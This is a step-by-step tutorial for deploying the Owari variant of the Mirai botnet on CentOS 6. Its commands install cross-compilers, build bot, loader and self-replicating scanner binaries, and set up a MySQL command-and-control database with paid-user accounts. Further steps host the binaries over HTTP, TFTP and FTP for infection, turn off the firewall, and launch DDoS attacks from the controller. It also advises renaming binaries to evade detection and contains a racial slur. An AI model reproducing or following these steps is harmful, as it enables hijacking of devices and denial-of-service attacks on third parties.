MIRAI TUTORIAL For Owari [CENTOS6] BY TNXL KD

NOTE: -BEFORE RUNNING ANY COMMANDS EDIT THE IPS main.c in dlr, loader, selfrep, and test
      - ALSO EDIT your mysql login UNDER main.go in cnc make sure the ip:port says 127.0.0.1:3306 and the other one SERVERIP:1543
	  -ALSO EDIT THE IP in scanListen.go should be like IP:4102
	  -ALSO EDIT THE IPs IN includes.h under bot and no-kill (The /bot/ the directory is the regular bot that kills, and obviously the no-kill doesn't.)
       
	   DO NOT RUN ANY COMMANDS BEFORE EDITING EVEYTHING OR YOU WILL BE FUCKED!

----------------------------------------------------------------

yum update -y
yum upgrade -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install nano screen wget bzip2 gcc gcc-c++ electric-fence sudo git libc6-dev vsftpd httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y

rm -rf /etc/xcompile
mkdir /etc/xcompile
cd /etc/xcompile
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-i486.tar.gz
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i486.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
rm -rf *.tar.bz2
mv cross-compiler-i586 i586
mv cross-compiler-i486 i486
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-i686 i686
mv cross-compiler-x86_64 x86-64
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/x86-64/bin
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

yum install curl git mercurial make binutils bison gcc -y

bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)
[[ -s "$HOME/.gvm/scripts/gvm" ]] && source "$HOME/.gvm/scripts/gvm"
gvm install go1.4 --binary
gvm use go1.4
export GOROOT_BOOTSTRAP=$GOROOT
gvm install go1.5 --binary
gvm install go1.7.4 --binary
gvm install go1.9 --binary
gvm use go1.7.4
gvm use go1.9
go get -d github.com/go-sql-driver/mysql
go get -d github.com/mattn/go-shellwords
go get -d golang.org/x/crypto/ssh

SETTING UP MYSQL DATA BASE:
---------------------------------------
mysql_install_db
sudo mkdir /var/run/mysqld; sudo chown mysql /var/run/mysqld
sudo mysqld_safe --skip-grant-tables&
sudo mysql --user=root mysql
exit
/usr/bin/mysql_secure_installation (set the root password of mysql here!)\
IF YOU ARE still in mysql type exit to get out of it

run my mysql again ----------> mysql -u root -p (IT WILL ASK YOU FOR YOUR MYSQL ROOT PASSWORD, THIS is the same one you just set earlier and should also be the same as the one in main.go).

create database mirai;
use mirai;

now paste these scripts/commands into mysql:
---------------------------------------

CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
--------------------------------------------------------------------------------------------------------------------------------------------------
LIKE I SAID BEFORE YOUR PASSWORD AND USERNAME SHOULD BE THE SAME AS YOUR MYSQL LOGIN and the same as the one in main.go for this script below

INSERT INTO users VALUES (NULL, 'root', 'DATABASE-PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');     //PASTE THIS TOO SKID!!!

after this one, type exit, it should say bye!
--------------------------------------------------------------------------------------------------------------------------------------------------
NOW WE ARE ALMOST THERE, NOW WE COMPILE EVERYTHING

COMPILE the cnc/.go files separately, for some reason the build.sh doesn't release the cnc correctly but eh!
go build -o server/cnc cnc/*.go (should be released to the loader directory) Place it somewhere else like in a new folder/dir Ex. mkdir server
if you don't compile the .go files first under /cnc/. when you do the build.sh it might disappear because most of the directories and files get deleted after compiling. 

./build.sh (YOU WILL GET A FEW ERRORS AT THE END WHICH IS NORMAL AS LONG AS YOU GET ALL THE BINARIES YOU ARE OK>)
[THIS IS OPTIONAL, but make sure you run build.sh first] ./no-kill.sh (IF YOU WANT THE Binaries for the bot that doesn't kill) it will say Owari.nokill.etc when it is release to html, tftpboot, and ftp.

THE binaries should be release to /var/ftp , /var/www/html/Binarys/, and var/lib/tftpboot 

make sure to rename your binaries so you want get bot killed.
i have provided the tbin.sh for tftp and the bins.sh for wget, change the dvrhelper to something random or whatever you want inside both the .sh files
also rename your binaries in the .sh files, and make sure the path is correct to where it says webserver and tftp server.


If the scanListen is not under /selfrep/ after compiling do this:

just drag the scanListen.go back onto the server again and edit the ip in it then do this command:
go build -o selfrep/scanListen scanListen.go


DAMN RIGHT NIGGA! WE READY NOW!

run these commands before screening the cnc and scanListen:

ulimit -n 999999
sysctl -w fs.file-max=999999
nano /usr/include/bits/typesizes.h




service iptables stop
service httpd restart or start
service vsftpd restart or start
service xinetd restart or start ( Do this b4 running this command, edit the tftp config under /etc/xinetd.d/tftp change disable=yes  to no)

now cd to where ever you put the cnc file and the scanListen

touch prompt.txt

screen ./cnc

should say Mysql DB Opened...

CTRL+A+D

screen ./scanListen

CTRL+A+D

NOW YOUR DONE!!!!!

login to the cnc through putty select telnet the port is 1543 and paste your ip and login with you root login to mysql

to addusers on mirai, type addusers

to see botcount: type bots

to see attack methods: type ?

dport=port you wanna use

len= packet length 

attack method ip time dport=[PORT] len=[pLength]

IM Pretty sure you can figure out how to pull in bots and make the exploits work!


